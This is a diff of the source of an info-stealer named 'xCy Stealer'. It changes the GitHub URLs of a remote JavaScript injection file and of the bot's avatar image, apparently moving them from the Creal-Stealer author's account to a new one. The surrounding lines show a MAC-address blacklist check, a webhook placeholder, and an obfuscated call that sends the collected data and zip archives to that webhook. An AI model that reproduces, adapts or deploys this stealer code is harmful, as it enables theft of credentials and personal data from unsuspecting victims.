@@ -53,7 +53,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 wh00k = "WEBHOOK HERE"
-inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+inj_url = "https://raw.githubusercontent.com/xCynicalHD/injection/main/index.js"
     
 DETECTED = False
 
@@ -707,12 +707,12 @@ def GatherZips(paths1, paths2, paths3):
             "color": 2895667,
             "footer": {
                 "text": "xCy Stealer",
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                "icon_url": "https://raw.githubusercontent.com/xCynicalHD/Stealer/main/img/xd.jpg"
             }
             }
         ],
         "username": "xCy Stealer",
-        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+        "avatar_url": "https://raw.githubusercontent.com/xCynicalHD/Stealer/main/img/xd.jpg",
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
